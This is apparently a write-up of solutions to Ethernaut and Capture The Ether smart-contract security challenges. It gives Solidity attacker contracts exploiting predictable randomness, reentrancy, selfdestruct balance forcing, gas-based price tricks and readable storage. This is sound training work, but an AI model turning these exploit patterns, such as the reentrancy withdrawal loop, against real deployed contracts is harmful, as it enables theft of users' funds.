# Smart contract security

Series of educational challenges

## Ethernaut 

### CoinFlip

We deploy the following attacker contract and we call the attack function on a sequence of ten consecutive blocks. 

```
pragma solidity 0.8.15;

contract CoinFlipAttacker {
    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address target) public {
        bool guess = calculateGuess();
        target.call(abi.encodeWithSignature("flip(bool)", guess));
    }

    function calculateGuess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
```

Each time, the attack function will estimate the guess and send it to the CoinFlip contract

### Elevator

We deploy the following the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

import "../challenge/Elevator.sol";

contract ElevatorAttacker is Building {
    bool private set;
    
    function attack(address target) external {
        Elevator(target).goTo(0);
    }

    function isLastFloor(uint) external returns(bool) {
        bool setTop = set; 
        set = !set;
        return setTop;
    }
}
```

The isLastFloor() function will get called twice returning a different value in both cases

### Shop

We deploy the following the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

import "../challenge/Shop.sol";

contract ShopAttacker {
    uint256 private constant REQUIRE_PRICE = 100;
    uint256 private constant GAS_THRESHOLD = 28_096_381;

    function attack(address target) external {
        Shop(target).buy();
    }

    function price() external view returns (uint256) {
        uint256 gas = gasleft();
        if(gas >= GAS_THRESHOLD) {
            return 100;
        } else {
            return 0;
        }
    }
}
```

The price() function will get called twice returning a different price in both cases based on the gas left. The `GAS_THRESHOLD` was estimated based on the gas consumption of the call.

### Re-entrance

We deploy the following the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

contract ReentranceAttacker {
    function attack(address target) external payable {
        payable(target).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }

    receive() external payable {
        if(msg.sender.balance > 0) {
            msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        }
    }
}
```

When the receive() function gets called, we can re-enter and withdraw funds before our balance gets updated

### Token

We can call transfer() with an amount of 21 and generate an underflow.

### Force

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

contract ForceAttacker {
    constructor() payable {}

    function attack(address target) external {
        selfdestruct(payable(target));
    }
}
```

By calling selfDestuct(), we make the Force contract to update its balance even without a fallback or receive function

### Naught Coin

The lockdown only applies to transfer() and not to the transferFrom() function of the ERC20 standard. We can approve ourselves and use transferFrom() to move the tokens

## Capture The Ether

### Guess the random number challenge

Storage slots are not private, we can observe what was stored in the first slot and use that value as the answer

### Guess the secret number challenge

As a uint8 was used, we know the value used previous to hashing is between 0-255. We can iterate and hash each number until we match the hash `0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365`

### Guess the new number challenge

We deploy the following the following attacker contract and we call the attack function. 

```
pragma solidity 0.4.21;

import "../challenge/GuessTheNewNumberChallenge.sol";
contract GuessTheNewNumberChallengeAttacker {
    function attack(address target) public payable {
        uint8 answer = calculateGuess();
        GuessTheNewNumberChallenge(target).guess.value(1 ether)(answer);
    }

    function calculateGuess() private view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function () external payable {}
}
```

We use the same estimations as the GuessTheNewNumberChallenge contract to calculate the guess.
